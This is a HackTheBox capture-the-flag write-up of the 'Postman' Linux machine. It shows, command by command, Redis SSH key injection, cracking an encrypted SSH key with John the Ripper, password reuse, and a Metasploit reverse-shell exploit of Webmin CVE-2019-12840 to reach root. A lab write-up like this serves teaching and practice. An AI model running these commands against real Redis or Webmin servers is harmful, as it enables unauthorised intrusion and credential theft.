---
title: "[EN] - HackTheBox: Postman Write-Up"
date: 2026-01-09 11:07:00 +0700
categories: [HackTheBox, Boxes, Easy, Linux]
tags: [Redis, SSH Key Injection, Backup file, Credential Reuse, Webmin RCE, CVE-2019-12840]
description: Postman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user's folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of Webmin. This is exploited through command injection to gain root privileges.
image: /assets/img/HTB-Postman_banner.png
---

## Enumeration

As usual, we start with an Nmap port scan to identify the services running on the target host.

### Open TCP Ports

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.2.1
# Nmap <REDACTED> scan initiated Fri Jan  9 14:05:53 2026 as: nmap -sVC -p- -T4 -oN nmap/TCP_all_services.nmap 10.129.2.1
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  9 14:06:31 2026 -- 1 IP address (1 host up) scanned in 37.72 seconds
```

Nmap return the usual ``ports 22 (SSH)`` and ``80 (HTTP)``, but also two less common ones : **Redis** on ``port 6379`` and a **Webmin** on port ``10000``.

---

## Initial Access

Using the redis-cli tool, we first tested for an unauthenticated login and found that the Redis server requires no authentication at all, meaning anyone who can reach port ``6379`` gets a usable prompt straight away.

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ redis-cli -h 10.129.2.1
10.129.2.1:6379>
```

With this level of access, we leveraged a well-known Redis attack technique known as SSH key injection. 
Because Redis allows a client to change its working directory and the name of the file it saves its dataset to, an attacker can trick the server into writing attacker controlled data to an arbitrary path on disk.
In this case, by setting the save directory to the Redis user's ``.ssh`` folder and the destination filename to ``authorized_keys``. 

Saving a crafted public key as the Redis dataset therefore drops that key straight into ``authorized_keys``, as long as the account the Redis service runs under can write to that location, which in practice grants us SSH access as that service account.

Before configuring the key in Redis, we started by generating a new key pair : 

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ ssh-keygen -t rsa -f redis_key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in redis_key
Your public key has been saved in redis_key.pub
The key fingerprint is:
SHA256:tf+eWusN7zZcLonvhSnrf98G5AprEs75j7emT1sWIxw tatsuki@parrot
The keys randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|          . E    |
|         . o ..  |
|        S . ooo  |
|        . .. .o=.|
|       o o o+oO+o|
|        = oo=OoX*|
|         ++BOOX*O|
+----[SHA256]-----+
```

We then prepared the public key with surrounding newlines, which helps keep the resulting ``authorized_keys`` entry well formed and avoids any parsing issues caused by Redis :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
```

With the key file ready, we used our Redis access to inject into the target's ``authorized_keys`` file by flushing any existing data, storing our key as the value for a new entry then redirecting Redis's save path and filename to the ``.ssh`` directory before triggering a save :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ redis-cli -h 10.129.2.1 flushall
OK

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ cat key.txt | redis-cli -h 10.129.2.1 -x set ssh_key
OK

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ redis-cli -h 10.129.2.1 config set dbfilename authorized_keys
OK

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ redis-cli -h 10.129.2.1 config set dir /var/lib/redis/.ssh
OK

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ redis-cli -h 10.129.2.1 save
OK
```

Once the key was injected, we authenticated over SSH using our generated private key, confirming that the technique had worked and that we now had a shell as the ``redis`` user :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ chmod 600 redis_key

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ ssh -i redis_key redis@10.129.2.1
The authenticity of host '10.129.2.1 (10.129.2.1)' can't be established.
ED25519 key fingerprint is SHA256:eBdalosj8xYLuCyv0MFDgHIabjJ9l3TMv1GYjZdxY9Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.2.1' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

<SNIP>

Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

---

## Privilege Escalation
### redis -> Matt

Looking through the redis user's home directory, we noticed that its ``.bash_history`` file had not been redirected to ``/dev/null``.
Its presence here suggested that earlier interactive sessions and anything typed during them, might still be recoverable.

```shell
redis@Postman:~$ pwd && ls -lah --color
/var/lib/redis
total 660K
drwxr-x---  7 redis redis 4.0K Jan  9 15:09 .
drwxr-xr-x 38 root  root  4.0K Sep 29  2020 ..
-rw-------  1 redis redis  399 Oct 25  2019 .bash_history
drwx------  2 redis redis 4.0K Aug 25  2019 .cache
drwx------  3 redis redis 4.0K Aug 25  2019 .gnupg
drwxrwxr-x  3 redis redis 4.0K Aug 26  2019 .local
drwxr-xr-x  2 redis root  4.0K Jan  9 15:11 .ssh
drwxr-xr-x  2 root  root  4.0K Oct 25  2019 6379
-rw-r-----  1 redis redis  46K Aug 26  2019 dkixshbr.so
-rw-rw----  1 redis redis  208 Jan  9 15:09 dump.rdb
-rw-r-----  1 redis redis  46K Aug 25  2019 ibortfgq.so
-rw-r-----  1 redis redis 431K Aug 25  2019 module.o
-rw-r-----  1 redis redis  46K Aug 25  2019 qcbxxlig.so
-rw-r-----  1 redis redis  46K Aug 25  2019 vlpaulhk.so
```

Reading through ``.bash_history`` revealed an interesting reference to an SSH private key backup, alongside commands showing a previous user switching to the user ``Matt`` and inspecting a file named ``id_rsa.bak``.

```shell
redis@Postman:~$ cat .bash_history

<SNIP>

cat /etc/ssh/sshd_config
su Matt
clear
cd /var/lib/redis
su Matt
exit
cat id_rsa.bak
ls -la
exit
cat id_rsa.bak
exit
```

Searching the filesystem for ``id_rsa.bak`` led us to a copy stored under ``/opt`` :

```shell
redis@Postman:~$ find / -name id_rsa.bak 2>/dev/null
/opt/id_rsa.bak
redis@Postman:~$ ll /opt/id_rsa.bak
-rwxr-xr-x 1 Matt Matt 1.8K Aug 26  2019 /opt/id_rsa.bak
```

Looking at the permissions on this file, the owner and group are both ``Matt``, so the access available to the ``redis`` user comes from the "other" permission bits rather than from any explicit grant to redis itself.
Those bits are set to ``r-x``, meaning the file is world readable and world executable, which is enough for us, to read out its contents. 

We then transferred Matt's private key to our attacking host :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ scp -i redis_key redis@10.129.2.1:/opt/id_rsa.bak matt_id_rsa
id_rsa.bak

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ ll matt_id_rsa
-rwxr-xr-x 1 tatsuki tatsuki 1,8K  9 janv. 16:23 matt_id_rsa
```

After setting the correct permissions on the key, we attempted to authenticate as ``Matt``, only to be prompted for the key's passphrase, which told us the private key itself was encrypted and would need to be cracked offline before it could be used :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ chmod 600 matt_id_rsa

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ ssh -i matt_id_rsa matt@10.129.2.1
Enter passphrase for key 'matt_id_rsa':
```

We proceeded to crack the passphrase with John the Ripper, first converting the key into a crackable hash format and then running it against the ``rockyou.txt`` wordlist, which recovered the passphrase almost instantly :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ /usr/share/john/ssh2john.py matt_id_rsa > matt_id_rsa.hash

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ john --wordlist=/usr/share/wordlists/rockyou.txt matt_id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
coXXXXXXXXX8     (matt_id_rsa)
1g 0:00:00:00 DONE (2026-01-09 16:29) 50.00g/s 12342Kp/s 12342Kc/s 12342KC/s confused6..colin22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

With the passphrase in hand, we tried authenticating again, but the connection was closed immediately by the server rather than dropping us into a shell :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ ssh -i matt_id_rsa Matt@10.129.2.1
Enter passphrase for key 'matt_id_rsa': 
Connection closed by 10.129.2.1 port 22
```

Since the ``.bash_history`` file showed that ``Matt`` had previously opened ``/etc/ssh/sshd_config``, we suspected the account might have been deliberately locked out of SSH, and checking the configuration confirmed it :

```shell
redis@Postman:/var/www$ cat /etc/ssh/sshd_config | grep -v "#"

<SNIP>

DenyUsers Matt

<SNIP>
```

The ``DenyUsers Matt`` directive explained the closed connection, ``Matt`` is explicitly barred from authenticating over SSH, regardless of whether the key and passphrase are valid. 
With that avenue closed, our last option was to try switching users locally with ``su``, on the assumption that ``Matt`` might reuse the same password as the key's passphrase :

```shell
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ whoami
Matt
Matt@Postman:/var/lib/redis$ cd ~
Matt@Postman:~$ cat user.txt
9602XXXXXXXXXXXXXXXXXXXXXX480814
```

The password reuse paid off, giving us a local shell as ``Matt`` and access to the user flag.

---

### Matt -> Root

Since Webmin on port ``10000`` appeared to authenticate against local system accounts rather than a separate user database, we tried logging in with ``Matt``'s cracked credentials and were able to access the Webmin interface. 

![](/assets/img/HTB-Postman_webmin_login.png)
![](/assets/img/HTB-Postman_webmin_dashboard.png)

Before attempting any exploitation, we wanted to confirm what privileges the Webmin process itself was running with, so we used the [pspy64](https://github.com/dominicbreuker/pspy) tool to observe running processes.

```shell
Matt@Postman:~$ chmod +x pspy64
Matt@Postman:~$ ./pspy64
pspy - version: <REDACTED> - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

<SNIP>

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done

<SNIP>

2026/01/09 16:35:55 CMD: UID=0     PID=1301   | /usr/share/webmin/package-updates/update.cgi

<SNIP>

2026/01/09 16:35:55 CMD: UID=0     PID=788    | /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf

<SNIP>
```

The output confirmed that Webmin was running as root, which meant that any authenticated code execution vulnerability in this version would translate directly into a root shell.
Searching for known exploits against the installed Webmin (version 1.910 found earlier by Nmap) turned up two relevant Metasploit modules :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ searchsploit webmin 1.910
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)        | linux/remote/46984.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                 | linux/webapps/47330.rb
------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Of the two results, the more relevant one was ``CVE-2019-12840``, affecting Webmin 1.910's "Package Updates" feature with a remote command execution flaw reachable by any authenticated user.
Since a Metasploit module already existed for this CVE, we configured and launched it with Matt's credentials :

```shell
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Easy/Postman]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/linux/http/webmin_packageup_rce
[*] Using configured payload cmd/unix/reverse_perl
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> setg LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> setg LPORT 9001
LPORT => 9001
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> set RHOSTS 10.129.2.1
RHOSTS => 10.129.2.1
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> set USERNAME Matt
USERNAME => Matt
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> set PASSWORD coXXXXXXXXX8
PASSWORD => coXXXXXXXXX8
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
[msf](Jobs:0 Agents:0) exploit(linux/http/webmin_packageup_rce) >> run
[*] Started reverse TCP handler on <attacker_ip>:9001
[+] Session cookie: 6c5ad2466eff6a8004af625c1d555f96
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (<attacker_ip>:9001 -> 10.129.2.1:50290) at 2026-10-08 15:01:37 +0200
id
uid=0(root) gid=0(root) groups=0(root)

hostname
Postman

cat /root/root.txt
4092XXXXXXXXXXXXXXXXXXXXXXc1c949
```

The exploit succeeded, dropping us into a command shell running as root and giving us access to the root flag.